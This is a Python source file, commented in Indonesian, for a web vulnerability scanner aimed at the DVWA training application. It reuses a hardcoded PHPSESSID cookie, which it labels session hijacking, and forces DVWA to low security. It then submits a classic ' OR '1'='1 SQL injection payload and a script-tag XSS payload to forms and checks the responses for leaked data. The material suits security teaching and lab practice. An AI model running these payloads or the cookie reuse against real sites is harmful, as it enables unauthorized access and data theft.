import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

class AegisWebAuditor:
    def __init__(self, target_url):
        # Pastikan URL lengkap dengan http/https
        if not target_url.startswith("http"):
            self.target_url = "https://" + target_url
        else:
            self.target_url = target_url
        
        self.session = requests.Session()
        # User-Agent agar tidak terlihat seperti bot biasa
        self.session.headers["User-Agent"] = "Aegis-Security-Scanner/4.0"

        # ==========================================================
        # [MODIFIKASI] SESSION HIJACKING CONFIGURATION
        # ==========================================================
        # GANTI string di bawah ini dengan PHPSESSID dari Browser kamu!
        # Contoh: phpsessid_value = "7ufk4bnurn4ne5q80dkgknfct7"
        
        phpsessid_value = "ftd7dk1emapbl0ces9isn13a44"  # <--- GANTI INI!
        
        # Kita set cookies agar tool dianggap "Sudah Login"
        self.session.cookies.set("PHPSESSID", phpsessid_value)
        self.session.cookies.set("security", "low") # Memaksa DVWA ke mode LOW
        
        print(f"[*] Session Hijacking aktif. Menggunakan Cookie: {phpsessid_value[:5]}...")

    def get_all_forms(self, url):
        """Mengambil semua form HTML dari halaman"""
        try:
            content = self.session.get(url).content
            soup = bs(content, "html.parser")
            return soup.find_all("form")
        except:
            return []

    def get_form_details(self, form):
        """Mengekstrak detail form (action, method, inputs)"""
        details = {}
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
            
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def submit_form(self, form_details, url, value):
        """Mencoba mengirim form dengan data palsu (payload)"""
        # Gabungkan URL target. Jika action kosong, submit ke URL saat ini.
        target_url = urljoin(url, form_details["action"])
        
        inputs = form_details["inputs"]
        data = {}
        
        for input in inputs:
            # Ganti input text/search/password dengan Payload kita
            if input["type"] in ["text", "search", "password", "number"]:
                input_name = input["name"]
                if input_name:
                    data[input_name] = value
            # Jika ada tombol submit, kita ikut sertakan (kadang wajib)
            if input["type"] == "submit" and input.get("name"):
                 data[input["name"]] = input.get("value", "Submit")

        if form_details["method"] == "post":
            return self.session.post(target_url, data=data)
        else:
            return self.session.get(target_url, params=data)

    def scan_sql_injection(self):
        """Mencari celah SQL Injection"""
        # Kita scan halaman SQL Injection DVWA secara spesifik
        # Karena kita sudah login, kita bisa akses URL ini:
        vuln_url = f"{self.target_url}/vulnerabilities/sqli/"
        
        print(f"[*] Mengecek SQL Injection pada {vuln_url}...")
        
        # Cek dulu apakah halaman bisa diakses (Login berhasil?)
        check = self.session.get(vuln_url)
        if "Login" in check.text and "Username" in check.text:
            print("[!] GAGAL LOGIN: Cookie PHPSESSID salah atau kadaluarsa!")
            return []

        forms = self.get_all_forms(vuln_url)
        vulnerabilities = []
        
        sql_errors = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "MariaDB server", # Khas DVWA
        ]
        
        # Payload SQL Injection Klasik
        payload = "' OR '1'='1" 

        for form in forms:
            form_details = self.get_form_details(form)
            res = self.submit_form(form_details, vuln_url, payload)
            
            if res:
                content_lower = res.content.decode().lower()
                # Jika jumlah user yang keluar banyak (misal admin, gordon), berarti JEBOL
                if "admin" in content_lower and "surname" in content_lower:
                    print(f"[!!!] SQL Injection Ditemukan! (Database Bocor)")
                    vulnerabilities.append({
                        "type": "SQL Injection (Authentication Bypass)",
                        "location": f"{vuln_url} (Form: {form_details['action']})",
                        "payload": payload
                    })
                    break # Cukup nemu 1
                
                # Atau cek error standar
                for error in sql_errors:
                    if error in content_lower:
                        vulnerabilities.append({
                            "type": "SQL Injection (Error Based)",
                            "location": vuln_url,
                            "payload": payload
                        })
                        break
        return vulnerabilities

    def scan_xss(self):
        """Mencari celah Cross-Site Scripting (XSS)"""
        # Kita scan halaman XSS DVWA secara spesifik
        vuln_url = f"{self.target_url}/vulnerabilities/xss_r/"
        
        print(f"[*] Mengecek XSS pada {vuln_url}...")
        forms = self.get_all_forms(vuln_url)
        vulnerabilities = []
        
        xss_payload = "<script>alert('Aegis')</script>"

        for form in forms:
            form_details = self.get_form_details(form)
            res = self.submit_form(form_details, vuln_url, xss_payload)
            
            if res:
                # Cek apakah script kita muncul mentah-mentah di HTML
                if xss_payload in res.content.decode():
                    print(f"[!!!] XSS Ditemukan!")
                    vulnerabilities.append({
                        "type": "Reflected XSS",
                        "location": f"{vuln_url} (Input: name)",
                        "payload": xss_payload
                    })
        return vulnerabilities